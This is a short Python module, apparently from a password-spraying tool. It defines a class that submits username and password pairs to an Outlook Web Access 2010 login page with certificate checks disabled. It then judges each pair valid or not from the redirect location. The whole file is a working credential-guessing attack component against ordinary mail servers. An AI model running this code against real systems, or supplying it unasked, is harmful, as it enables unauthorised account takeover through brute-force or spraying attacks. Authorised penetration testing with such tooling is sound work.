#!/usr/bin/env python3
import warnings
warnings.filterwarnings('ignore')
from re import search
import requests

class OWA2010:

    def __init__(self, url, flags=0,
            forcedownlevel=0,trusted=0, isUtf8=1,
            proxies={}, headers={}, verify_ssl=False):
        '''
        Arguments:

        - url: string - The URL that credentials will be POSTed to
        - proxies: dict - Proxies configuration passed to requests
        - headers: dict - headers configuration passed to requests
        - verify_ssl: bool - determine if ssl certificate should be verified

        POST parameter arguments:

        These parameters are observed in the POST request sent to the
        server.

        You can get these values by inspecting the request via Burp.

        - flags: int
        - forcedownlevel: int
        - trusted: int
        - isUtf8: int
        '''

        self.url = url
        self.flags = flags
        self.forcedownlevel = forcedownlevel
        self.trusted = trusted
        self.isUtf8 = isUtf8
        self.proxies = proxies
        self.headers = headers
        self.verify_ssl = verify_ssl

    def __call__(self,username,password,*args,**kwargs):
    
        # post data
        data = {
            'destination':self.url,
            'flags':self.flags,
            'forcedownlevel':self.forcedownlevel,
            'trusted':self.trusted,
            'username':username,
            'password':password,
            'isUtf8':self.isUtf8
        }
    
        # make the request
        resp = requests.post(self.url,
                data=data,
                headers=self.headers,
                verify=self.verify_ssl,
                allow_redirects=False,
                proxies=self.proxies)
    
        # verify credentials and return outcome
        if resp.status_code == 302 and resp.headers['Location'] and (
            search(r'auth\/logon\.aspx\?', resp.headers['Location'])):
            return [0, username, password]
        else:
            return [1, username, password]
